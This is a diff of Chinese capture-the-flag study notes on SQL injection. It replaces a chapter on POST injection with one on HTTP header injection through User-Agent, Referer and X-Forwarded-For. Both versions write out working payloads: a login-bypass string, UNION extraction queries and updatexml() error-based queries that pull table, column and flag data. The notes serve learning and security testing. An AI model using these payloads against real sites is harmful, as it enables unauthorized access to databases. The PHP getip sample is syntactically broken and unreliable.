@@ -1,86 +1,166 @@
-# Chapter 3.2 - POST Injection
+# chapter 3.3 - HEAD Injection
 
 [TOC]
 
-## 0x00 原理
+## 0x01 原理与相关概念
 
-### POST注入
+### HTTP请求头（HEAD）
 
->POST请求：向指定资源提交数据进行处理请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。
+包含的常用信息：
 
-在HTML中，POST传参方式会将表单打包后隐藏在后台发送给服务器，通常是通过页面文本表单(Form)和文件上传表单和JSON表单、XML表单。
+1. **User-Agent**：浏览器身份标识的字符串。
+2. **Cookie**：个人认证和跨页面固定参数。
+3. **Referer**：表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。
 
-对应的标识和传参方式：
+HEAD注入即在向页面传参时将payload构建在HTTP请求头的位置。
 
-|        传参类型        |           传参编码标识            |                     传参方式                     |
-| :--------------------: | :-------------------------------: | :----------------------------------------------: |
-| FORM表单（**最常见**） | application/x-www-form-urlencoded |           与GET型相同，`属性名=参数名`           |
-|      文件上传表单      |        multipart/form-data        | `------WebKitFormBoundaryXXXXXX`分割的结构化信息 |
-|     JSON域/XML表单     |         application/json          |           按照JSON/XML调用规范编写传参           |
+### 超全局变量
 
-而POST注入和之前的GET显错注入相同，只是将注入点换为以上的传参类型指定的位置，用特定的传参方式进行传参。
+> 在PHP中许多的预定义变量都是超全局的，这意味着它们在一个脚本的全部作用域中都可用
 
-### 万能密码
+|   超全局变量 |                             含义                             |
+| -----------: | :----------------------------------------------------------: |
+|    $_REQUEST |         获取GET/POST/COOKIE（新版本不能获取COOKIE）          |
+|       $_POST |                         获取POST传参                         |
+|        $_GET |                         获取GET传参                          |
+|     $_COOKIE |                        获取COOKIE传参                        |
+| **$_SERVER** | （※功能强大） 包含了诸如头信息(HEADER)、路径(PATH)、以及脚本位置等信息的数组 |
+
+常用的$_SERVER参数获取：
+
+$_SERVER['HTTP_REFERER']  --- 获取Referer请求头数据
+
+$_SERVER["HTTP_USER_AGENT"]  --- 获取用户相关信息，包括用户浏览器、操作系统等信息。
+
+$_SERVER["REMOTE_ADDR"]  --- 浏览网页的用户IP。
+
+### updatexml()函数
+
+updatexml() 是更新xml文档的函数，语法：
 
 ```mysql
-万能密码：'or 1=1 --+
+updatexml([locate_content],[PATH],[update_content])
 ```
 
-假设数据库中存放用户信息的表是**admin**，其中存放用户名的字段是**username**，存放密码的字段是**password**，在用户验证页面中用来接收用户所输入的用户名和密码的变量分别是**uname**和**pwd**，当用户在用户验证页面输入用户名和密码后，会提交给如下的语句进行处理：
+在正常的使用中，我们通过把三个参数分别填入目标XML内容，XML文档路径，更新的XML内容来对XML文档进行更新。但是当我们在XML文档路径填入特殊符号（如：`!`和`~`）时，由于不符合第二个参数所需要的Xpath格式的字符串于是将错误路径进行报错，于是利用这个特性我们可以构成以下payload：
 
 ```mysql
-SELECT * FROM admin where `username`='$uname' and `password` = '$pwd'
+updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+#可见PATH部分我们使用的以下函数：
+concat(0x7e,(SELECT database()),0x7e)
+#实际上为拼接字符串：
+~[SELECT database()]~ -- 由于MySQL执行十六进制字符串，"~"对对应的便是"0x7e"
 ```
 
-而在输入万能密码后得到的语句：
+于是在执行时，数据库便会在执行了此子查询后将错误信息报告出来，实现了报错注入。
 
-```mysql
-SELECT * FROM admin where `username`='XXX' and `password` = ''or 1=1 --+'
+### X-Forwarded-For参数
+
+当今多数缓存服务器的用户为了通过缓存的方式降低外部带宽，常常鼓励或强制用户使用代理服务器接入互联网。而WEB服务器为了能够获取到用户的真实IP便会读取用户请求中的`X-Forwarded-For`参数(如果存在)。
+
+以下的GetIP函数为大量网站及CMS广泛使用：
+
+```php
+function getip(){
+    if(getenv('HTTP_CLIENT_IP')){
+        $ip = getenv('HTTP_CLIENT_IP');
+    }else if(getenv('HTTP_X_FORWARDED_FOR'){
+        $ip = getenv('HTTP_X_FORWARDED_FOR');
+    }else if getenv('HTTP_X_FORWARDED'){
+        $ip = getenv('HTTP_X_FORWARDED');
+    }else if getenv('HTTP_FORWARDED_FOR'){
+        $ip = getenv('HTTP_FORWARDED_FOR');
+    }else if getenv('HTTP_FORWARDED'){
+        $ip = getenv('HTTP_FORWARDED'); 
+        //以上通过X-FORWARDED-FOR参数均能传参，为客户端指定的向代理转发的真实IP
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR']; 
+        //REMOTE_ADDR代表着与服务器建立TCP链接的目标客户端IP，如果存在代理，则为代理机器的IP值
+    }
+    return $ip;
+}
 ```
 
-由此可知，在用户名和密码检索失败后会转入用户输入的语句`or 1=1`，
+由上述源码可见，在WEB服务器获取用户或代理IP时并没有进行过滤，于是便存在了注入漏洞。
 
-使where后的条件均为真，则可以绕过验证登陆。
+## 0x02 注入思路
 
-## 0x01 靶场实战
+1. 暴破出弱用户名及密码
 
-1. 尝试万能密码登入，成功
+   由于HEADER的验证保存需要空间成本，所以通常不会记录登录失败的用户，要进行暴破登入
 
-2. 进行字段数的猜解`order by X -- qwe`，在顺次输入到输入order by 4后出现报错，说明该表只存在四个字段
+2. 在HTTP请求头中设置payload
 
-3. 通过SQLi方法找出表名
+3. 通过添加或修改X-Forwarded-For参数设置payload
 
-   ``` mysql
-   UNION SELECT 1,2,TABLE_NAME from information_schema.tables where table_schema=database() -- qwe 
-   ```
+4. 通过页面内数据库报错获取信息
 
-4. 找出对应的字段名
+## 0x03 靶场实战
 
-   ```mysql
-   UNION SELECT 1,2,column_name from information_schema.columns where table_schema=database() and table_name='flag' -- qwe 
-   ```
+1. 暴破出用户名和密码
 
-5. 得到FLAG
+   ![](https://i.loli.net/2020/11/16/dYPlkCnaZsFS3O5.png)
 
-   ```mysql
-   UNION SELECT 1,2,flag from flag -- qwe
-   ```
-
-   
-
-## 0x02 修复方法
-
-1. 万能密码的修复方法
-
-   通过PHP链接到数据库文件中添加转义语句将语句符号强制转换为字符串再传入数据库：
+2. 审查源码，发现传参方式为USER_AGENT
 
    ```php
-   $user = mysql_real_escape_string($_POST[‘user’]);
+   $_SERVER['HTTP_USER_AGENT']
    ```
 
-2. 注入部分修复与上一章SQLi相同。
+   ![](https://i.loli.net/2020/11/16/8awWUo9tsjbul6Z.png)
 
-## 0x03 附加
+3. 审查源码，发现POST注入的表单框由于添加了转义字符无法实现SQL注入
 
-1. POST传参大概率没有长度限制，相比GET注入来说攻击者可以上传更加危险的信息。
-2. 使用Sqlmap进行自动检测漏洞时可以使用`--form`语句，使用`*`定位注入点。
+4. 在请求头设置payload
+
+   1. 在靶场1中使用USER-AGENT传参
+
+      ```mysql
+      1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
+      ```
+
+      ​	![3.png](https://i.loli.net/2020/11/16/PwSYD6NUxcjpZme.png)
+
+      **数据库在页面上显示出报错：**
+
+      ![4.png](https://i.loli.net/2020/11/16/SsUhRn2mft173GB.png)
+
+      **按照常规SQL注入方法替换payload进行注入**
+
+      ```mysql
+      1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),'3') -- qwe 找表名
+      
+      1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='flag_head' limit 1,1)),1),'3') -- qwe 找字段名
+      
+      1' and updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 1,1)),1),'3') -- qwe 找flag
+      ```
+
+      ![5.png](https://i.loli.net/2020/11/16/vrTAq4pmWzUblO8.png)
+
+      ![](https://i.loli.net/2020/11/16/8OpDISXFV7P21lU.png)
+
+      ![](https://i.loli.net/2020/11/16/8OpDISXFV7P21lU.png)
+
+      ![7.png](https://i.loli.net/2020/11/16/z1LjuKcdFkSBM6y.png)
+
+   2. 在靶场2中将Header改为Referer传参
+
+   3. 在靶场3中使用X-Forward-For传参
+
+      ```php
+      X-Forwarded-For: 1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
+      ```
+
+	![8.png](https://i.loli.net/2020/11/16/IQxMop2VlfurCRZ.png)
+
+      ![9.png](https://i.loli.net/2020/11/16/XDqIB1WpQZye5iY.png)
+
+
+## 0x03 思考与要点
+
+1. X-Forward-For参数在HEAD内本不包含时可以尝试手动添加。
+2. HEAD内所有参数传参时记得在参数名冒号后加空格。
+3. `and`表示逻辑与，`or`表示逻辑或，按优先级排序`and > or`。在注入过程中可能因为函数的结合问题影响优先级，可以分别尝试and和or。
+
+
+
